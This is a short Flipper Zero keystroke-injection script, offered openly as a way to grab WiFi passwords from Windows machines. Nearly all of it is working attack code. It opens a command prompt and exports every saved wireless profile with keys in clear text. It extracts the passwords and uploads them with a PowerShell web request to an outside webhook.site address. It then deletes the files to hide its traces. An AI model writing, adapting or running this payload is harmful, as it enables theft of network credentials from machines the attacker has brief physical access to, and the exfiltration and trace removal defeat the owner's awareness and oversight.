REM This is a flipperzero script to grab WiFi passwords from Windows machines.
REM Tested on Windows 11 Professional (without UAC enabled and a user with local administrator rights).
REM Remember to replace the URL parameter with your own unique parameter from https://webhook.site/.
REM (c) 2023 Peter Feil
REM -------------------------------------------------------
DELAY 3000
GUI r
DELAY 100
STRING cmd /k
ENTER
DELAY 500
STRING cd %temp%
ENTER
DELAY 500
STRING netsh wlan export profile key=clear
ENTER
DELAY 1000
ENTER
STRING powershell Select-String -Path WLAN*.xml -Pattern 'keyMaterial' > WiFi-PASS
ENTER
DELAY 1000
STRING powershell Invoke-WebRequest -Uri https://webhook.site/e8b12c13-ea85-46e0-950c-c20654dee2fe -Method POST -InFile WiFi-PASS
ENTER
DELAY 1000
STRING del WiFi* /s /f /q
ENTER
DELAY 100
STRING del WLAN* /s /f /q
ENTER
DELAY 100
STRING exit
ENTER
